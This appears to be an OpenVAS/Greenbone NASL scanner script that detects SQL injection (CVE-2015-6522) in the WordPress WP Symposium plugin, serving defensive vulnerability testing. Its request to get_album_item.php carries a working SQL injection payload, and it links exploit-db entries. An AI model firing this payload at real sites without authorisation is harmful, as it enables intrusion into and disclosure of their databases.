# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806026");
  script_version("2023-07-25T05:05:58+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"creation_date", value:"2015-08-24 15:13:35 +0530 (Mon, 24 Aug 2015)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("WordPress WP Symposium Multiple SQL Injection Vulnerabilities");
  script_cve_id("CVE-2015-6522");

  script_tag(name:"summary", value:"The WordPress plugin 'WP Symposium' is prone to multiple sql injection vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to execute sql query or not.");

  script_tag(name:"insight", value:"Multiple flaws are due to input validation
  errors in 'forum_functions.php' and 'get_album_item.php' in WP Symposium
  plugin.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to inject or manipulate SQL queries in the back-end database,
  allowing for the manipulation or disclosure of arbitrary data.");

  script_tag(name:"affected", value:"WordPress WP Symposium Plugin version
  15.5.1 and probably all existing previous versions may also be affected.");

  script_tag(name:"solution", value:"Update to WP Symposium version 15.8 or
  later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/37824");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/37822");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/wp-content/plugins/wp-symposium/get_album_item.php?size=version%28%29%20;%20--";

if(http_vuln_check(port:port, url:url, check_header:TRUE, pattern:"([0-9.]+)",
                   extra_check:"Set-Cookie: PHPSESSID")) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
